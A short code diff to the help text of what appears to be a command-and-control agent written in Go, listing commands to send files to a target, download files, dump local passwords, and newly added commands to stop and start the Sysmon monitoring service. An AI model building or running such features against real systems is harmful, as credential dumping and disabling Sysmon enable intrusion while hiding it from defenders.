@@ -123,6 +123,8 @@ func helpHandler(comando []string) {
 		println("send:                  Send Files to Target")
 		println("get:                   Download Files to Host")
 		println("exit:                  Exite for Agente Selected")
+		println("stopsys:                  Stop Sysmon Service Running")
+		println("startsys:                  Start Sysmon Service Running")
 		//TODO - Modulo de Quebrar Senhas
 		println("passwd:           Dump Passwords for local machine")
 	} else {
